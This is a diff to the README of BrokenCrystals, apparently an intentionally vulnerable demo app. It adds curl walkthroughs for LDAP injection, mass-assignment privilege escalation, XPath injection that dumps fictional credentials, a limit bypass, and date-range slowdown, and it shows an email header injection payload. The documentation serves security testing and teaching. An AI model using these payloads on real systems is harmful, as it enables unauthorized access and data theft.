@@ -331,6 +331,22 @@ Full configuration & usage examples can be found in our [demo project](https://g
 - **HTTP Method fuzzer** - The server supports uploading, deletion, and getting the content of a file via /put.raw addition to the URL. The actual implementation using a regular upload endpoint of the server and the /put.raw endpoint is mapped in Nginx.
 
 - **LDAP Injection** - The login request returns an LDAP query for the user's profile, which can be used as a query parameter in /api/users/ldap _query_ query parameter. The returned query can be modified to search for other users. If the structure of the LDAP query is changed, a detailed LDAP error will be returned (with LDAP server information and hierarchy).
+  <details>
+    <summary>LDAP Injection Example Exploitation</summary>
+
+  ```bash
+  curl "https://brokencrystals.com/api/users/ldap?query=%28%26%28objectClass%3Dperson%29%28objectClass%3Duser%29%28email%3D%2A%29%29"
+  ```
+
+  This is a URI-encoded version of the following query:
+
+  ```text
+  https://brokencrystals.com/api/users/ldap?query=(&(objectClass=person)(objectClass=user)(email=*))
+  ```
+
+  The query retrieves information about all users with an email address, using the wildcard `*` to match any email. This demonstrates how the endpoint can be exploited to extract sensitive information from the LDAP directory.
+
+  </details>
 
 - **Local File Inclusion (LFI)** - The /api/files endpoint returns any file on the server from the path that is provided in the _path_ param. The UI uses this endpoint to load crystal images on the landing page.
 
@@ -386,6 +402,67 @@ Full configuration & usage examples can be found in our [demo project](https://g
       </details>
 
 - **Mass Assignment** - You can add to user admin privileges upon creating user or updating userdata. When you are creating a new user /api/users/basic you can use additional hidden field in body request { ... "isAdmin" : true }. If you are trying to edit userdata with PUT request /api/users/one/{email}/info you can add this additional field mentioned above. For checking admin permissions there is one more endpoint: /api/users/one/{email}/adminpermission.
+  <details>
+    <summary>Hidden Field Exploitation for Privilege Escalation</summary>
+      1. Creating a Regular User
+
+      ```bash
+      curl 'https://brokencrystals.com/api/users/basic' -X POST \
+        -H 'Content-Type: application/json' \
+        --data-raw '{"email":"regular_user","firstName":"John","lastName":"Doe","company":"Test","cardNumber":"123","phoneNumber":"555-1234","password":"password123","op":"basic"}'
+      ```
+
+      2. Login as Regular User
+
+      ```bash
+      curl 'https://brokencrystals.com/api/auth/login' -X POST \
+        -H 'Content-Type: application/json' \
+        --data-raw '{"user":"regular_user","password":"password123","op":"basic"}'
+      ```
+
+      The response will contain an authorization token:
+
+      ```
+      {"auth-token":"eyJ0eXAiOiJKV1QiLCJhbGci..."}
+      ```
+
+      3. Verify No Admin Permissions for Regular User
+
+      ```bash
+      curl 'https://brokencrystals.com/api/users/one/regular_user/adminpermission' \
+        -H 'authorization: eyJ0eXAiOiJKV1QiLCJhbGci...'
+      ```
+
+      Response returns `false`, indicating no admin permissions.
+
+      4. Creating a User with Admin Privileges (Exploiting the Vulnerability)
+
+      ```bash
+      curl 'https://brokencrystals.com/api/users/basic' -X POST \
+        -H 'Content-Type: application/json' \
+        --data-raw '{"isAdmin":true,"email":"admin_user","firstName":"Admin","lastName":"User","company":"Test","cardNumber":"123","phoneNumber":"555-5678","password":"password123","op":"basic"}'
+      ```
+
+      5. Login as Admin User
+
+      ```bash
+      curl 'https://brokencrystals.com/api/auth/login' -X POST \
+        -H 'Content-Type: application/json' \
+        --data-raw '{"user":"admin_user","password":"password123","op":"basic"}'
+      ```
+
+      This will return another authorization token for the admin user.
+
+      6. Verify Admin Permissions for the Admin User
+
+      ```bash
+      curl 'https://brokencrystals.com/api/users/one/admin_user/adminpermission' \
+        -H 'authorization: eyJ0eXAiOiJKV1QiLCJhbGci...'
+      ```
+
+      Response returns `true`, confirming admin permissions have been granted.
+
+  </details>
 
 - **Open Database** - The index.html file includes a link to manifest URL, which returns the server's configuration, including a DB connection string.
     <details>
@@ -791,6 +868,18 @@ Full configuration & usage examples can be found in our [demo project](https://g
   ```
 
 - **Business Constraint Bypass** - The `/api/products/latest` endpoint supports a `limit` parameter, which by default is set to 3. The `/api/products` endpoint is a password protected endpoint which returns all the products, yet if you change the `limit` param of `/api/products/latest` to be high enough you could get the same results without the need to be authenticated.
+  <details>
+    <summary>Example Exploitation of Business Constraint Bypass</summary>
+
+  ```bash
+  # Normal request that returns only 3 latest products
+  curl https://brokencrystals.com/api/products/latest
+
+  # Bypassing the constraint to get all products without authentication
+  curl https://brokencrystals.com/api/products/latest?limit=1000
+  ```
+
+  </details>
 
 - **ID Enumeration** - There are a few ID Enumeration vulnerabilities:
 
@@ -804,6 +893,53 @@ Full configuration & usage examples can be found in our [demo project](https://g
   3. The endpoint GET `/api/partners/query` is a raw XPATH injection endpoint. You can put whatever you like there. It is not referenced in the frontend, but it is an exposed API endpoint.
   4. Note: All endpoints are vulnerable to error based payloads.
 
+  <details>
+    <summary>Example Exploitation of XPATH Injection</summary>
+
+  To demonstrate an XPATH injection attack, you can use the following `curl` command:
+
+  ```bash
+  $ curl "https://brokencrystals.com/api/partners/partnerLogin?user=anyuser&password=%27%20or%20%271%27%3D%271"
+  ```
+
+  Response:
+
+  ```xml
+  <?xml version="1.0" encoding="UTF-8"?>
+  <root>
+    <name>Walter White</name>
+    <age>50</age>
+    <profession>Chemistry Teacher</profession>
+    <residency country="US" state="New Mexico" city="Albuquerque"/>
+    <username>walter100</username>
+    <password>Heisenberg123</password>
+    <wealth>15M USD</wealth>
+    <name>Jesse Pinkman</name>
+    <age>25</age>
+    <profession>Professional Product Distributer</profession>
+    <residency country="US" state="New Mexico" city="Yo Moma"/>
+    <username>dapinkman69</username>
+    <password>Yoyo1!</password>
+    <wealth>5M USD</wealth>
+    <name>Michael Ehrmantraut</name>
+    <age>65</age>
+    <profession>Personal Security Agent</profession>
+    <residency country="US" state="New Mexico" city="Albuquerque"/>
+    <username>_safetyman_</username>
+    <password>LittleKid777</password>
+    <wealth>50M USD</wealth>
+    <name>Gus Fring</name>
+    <age>52</age>
+    <profession>Restaurant Chain Owner</profession>
+    <residency country="US" state="New Mexico" city="Albuquerque"/>
+    <username>ChickMan</username>
+    <password>GoodChicken4U</password>
+    <wealth>Too much USD</wealth>
+  </root>
+  ```
+
+  </details>
+
 - **Prototype Pollution** - The `/marketplace` endpoint is vulnerable to prototype pollution using the following methods:
 
   1. The EP GET `/marketplace?__proto__[Test]=Test` represents the client side vulnerability, by parsing the URI (for portfolio filtering) and converting
@@ -816,12 +952,225 @@ Full configuration & usage examples can be found in our [demo project](https://g
      will lead to a creation of `uriParams.status`, which is a parameter used in the final JSON response.
 
 - **Date Manipulation** - The `/api/products?date_from={df}&date_to={dt}` endpoint fetches all products that were created between the selected dates. There is no limit on the range of dates and when a user tries to query a range larger than 2 years querying takes a significant amount of time. This EP is used by the frontend in the `/marketplace` page.
+  <details>
+    <summary>Example Exploitation of Date Manipulation</summary>
 
+  To demonstrate the issue, you can use the following `curl` commands:
+
+  1. **Querying a Short Date Range**:
+
+     ```bash
+     time curl 'https://brokencrystals.com/api/products?date_from=11-04-2024&date_to=12-04-2025' \
+     -H 'authorization: YOUR_AUTH_HEADER'
+     ```
+
+     Response:
+
+     ```json
+     [
+       {
+         "createdAt": "2025-04-11T07:47:25.000Z",
+         "name": "Opal",
+         "category": "Healing",
+         "photoUrl": "/api/file?path=config/products/crystals/opal.jpg&type=image/jpg",
+         "description": "the precious stone",
+         "viewsCount": 82,
+         "id": 3
+       },
+       {
+         "createdAt": "2025-04-11T07:47:25.000Z",
+         "name": "Ruby",
+         "category": "Gemstones",
+         "photoUrl": "/api/file?path=config/products/crystals/ruby.jpg&type=image/jpg",
+         "description": "an intense heart crystal",
+         "viewsCount": 141,
+         "id": 2
+       },
+       {
+         "createdAt": "2025-04-11T07:47:25.000Z",
+         "name": "Shattuckite",
+         "category": "Jewellery",
+         "photoUrl": "/api/file?path=config/products/crystals/shattuckite.jpg&type=image/jpg",
+         "description": "mistery",
+         "viewsCount": 1310,
+         "id": 7
+       },
+       {
+         "createdAt": "2025-04-11T07:47:25.000Z",
+         "name": "Amber",
+         "category": "Healing",
+         "photoUrl": "/api/file?path=config/products/crystals/amber.jpg&type=image/jpg",
+         "description": "fossilized tree resin",
+         "viewsCount": 98,
+         "id": 5
+       },
+       {
+         "createdAt": "2025-04-11T07:47:25.000Z",
+         "name": "Sapphire",
+         "category": "Jewellery",
+         "photoUrl": "/api/file?path=config/products/crystals/sapphire.jpg&type=image/jpg",
+         "description": "",
+         "viewsCount": 68,
+         "id": 4
+       },
+       {
+         "createdAt": "2025-04-11T07:47:25.000Z",
+         "name": "Emerald",
+         "category": "Jewellery",
+         "photoUrl": "/api/file?path=config/products/crystals/emerald.jpg&type=image/jpg",
+         "description": "symbol of fertility and life",
+         "viewsCount": 206,
+         "id": 6
+       },
+       {
+         "createdAt": "2025-04-11T07:47:25.000Z",
+         "name": "Amethyst",
+         "category": "Healing",
+         "photoUrl": "/api/file?path=config/products/crystals/amethyst.jpg&type=image/jpg",
+         "description": "a violet variety of quartz",
+         "viewsCount": 1359,
+         "id": 1
+       },
+       {
+         "createdAt": "2025-04-11T07:47:25.000Z",
+         "name": "Bismuth",
+         "category": "Gemstones",
+         "photoUrl": "/api/file?path=config/products/crystals/bismuth.jpg&type=image/jpg",
+         "description": "rainbow",
+         "viewsCount": 1254,
+         "id": 8
+       }
+     ]
+     ```
+
+     Execution Time: `0.652s`
+
+  2. **Querying a Long Date Range**:
+
+     ```bash
+     time curl 'https://brokencrystals.com/api/products?date_from=11-04-2000&date_to=12-04-2025' \
+     -H 'authorization: YOUR_AUTH_HEADER'
+     ```
+
+     Response:
+
+     ```json
+     [
+       {
+         "createdAt": "2025-04-11T07:47:25.000Z",
+         "name": "Bismuth",
+         "category": "Gemstones",
+         "photoUrl": "/api/file?path=config/products/crystals/bismuth.jpg&type=image/jpg",
+         "description": "rainbow",
+         "viewsCount": 1254,
+         "id": 8
+       },
+       {
+         "createdAt": "2025-04-11T07:47:25.000Z",
+         "name": "Sapphire",
+         "category": "Jewellery",
+         "photoUrl": "/api/file?path=config/products/crystals/sapphire.jpg&type=image/jpg",
+         "description": "",
+         "viewsCount": 68,
+         "id": 4
+       },
+       {
+         "createdAt": "2025-04-11T07:47:25.000Z",
+         "name": "Emerald",
+         "category": "Jewellery",
+         "photoUrl": "/api/file?path=config/products/crystals/emerald.jpg&type=image/jpg",
+         "description": "symbol of fertility and life",
+         "viewsCount": 206,
+         "id": 6
+       },
+       {
+         "createdAt": "2025-04-11T07:47:25.000Z",
+         "name": "Amethyst",
+         "category": "Healing",
+         "photoUrl": "/api/file?path=config/products/crystals/amethyst.jpg&type=image/jpg",
+         "description": "a violet variety of quartz",
+         "viewsCount": 1359,
+         "id": 1
+       },
+       {
+         "createdAt": "2025-04-11T07:47:25.000Z",
+         "name": "Opal",
+         "category": "Healing",
+         "photoUrl": "/api/file?path=config/products/crystals/opal.jpg&type=image/jpg",
+         "description": "the precious stone",
+         "viewsCount": 82,
+         "id": 3
+       },
+       {
+         "createdAt": "2025-04-11T07:47:25.000Z",
+         "name": "Ruby",
+         "category": "Gemstones",
+         "photoUrl": "/api/file?path=config/products/crystals/ruby.jpg&type=image/jpg",
+         "description": "an intense heart crystal",
+         "viewsCount": 141,
+         "id": 2
+       },
+       {
+         "createdAt": "2025-04-11T07:47:25.000Z",
+         "name": "Shattuckite",
+         "category": "Jewellery",
+         "photoUrl": "/api/file?path=config/products/crystals/shattuckite.jpg&type=image/jpg",
+         "description": "mistery",
+         "viewsCount": 1310,
+         "id": 7
+       },
+       {
+         "createdAt": "2025-04-11T07:47:25.000Z",
+         "name": "Amber",
+         "category": "Healing",
+         "photoUrl": "/api/file?path=config/products/crystals/amber.jpg&type=image/jpg",
+         "description": "fossilized tree resin",
+         "viewsCount": 98,
+         "id": 5
+       },
+       {
+         "createdAt": "2023-12-10T12:00:00.000Z",
+         "name": "Axinite",
+         "category": "Gemstones",
+         "photoUrl": "/api/file?path=config/products/crystals/axinite.jpg&type=image/jpg",
+         "description": "brown",
+         "viewsCount": 0,
+         "id": 10
+       },
+       {
+         "createdAt": "2020-11-18T12:00:00.000Z",
+         "name": "Pietersite",
+         "category": "Gemstones",
+         "photoUrl": "/api/file?path=config/products/crystals/pietersite.jpg&type=image/jpg",
+         "description": "blue",
+         "viewsCount": 0,
+         "id": 11
+       },
+       {
+         "createdAt": "2005-01-10T12:00:00.000Z",
+         "name": "Labradorite",
+         "category": "Gemstones",
+         "photoUrl": "/api/file?path=config/products/crystals/labradorite.jpg&type=image/jpg",
+         "description": "rainbow",
+         "viewsCount": 0,
+         "id": 9
+       }
+     ]
+     ```
+
+     Execution Time: `2.647s`
+
+</details>
 - **Email Injection** - The `/api/email/sendSupportEmail` is vulnerable to email injection by supplying tempered recipients.
   To exploit the EP you can dispatch a request as such `/api/email/sendSupportEmail?name=Bob&to=username%40email.com%0aCc:%20bob@domain.com&subject=Help%20Request&content=I%20would%20like%20to%20request%20help%20regarding`.
   This will lead to the sending of a mail to both `username@email.com` and `bob@domain.com` (as the Cc).
   Note: This EP is also vulnerable to `Server side prototype pollution`, as mentioned in this README.
 
-- **Insecure Output Handling** - The `/chat` route is vulnerable to non-sanitized output originating from the LLM response.
-  Issue a `POST /api/chat` request with body payload like `[{"content": "Provide a minimal html markup for img tag with invalid source and onerror attribute with alert", "role": "user"}]`.
-  The response will include raw HTML code. If this output is not properly sanitized before rendering, it can trigger an alert box in the user interface.
+- **Insecure Output Handling** - The `/chat` route is vulnerable to insecure output handling, where the LLM response is not properly sanitized before being rendered. This can lead to the execution of malicious scripts if the response contains unsanitized HTML or JavaScript.
+
+  <details>
+    <summary>Insecure Output Handling Example</summary>
+
+  ![Insecure Output Handling Demonstration](docs/insecure_output_handling.gif)
+
+  </details>
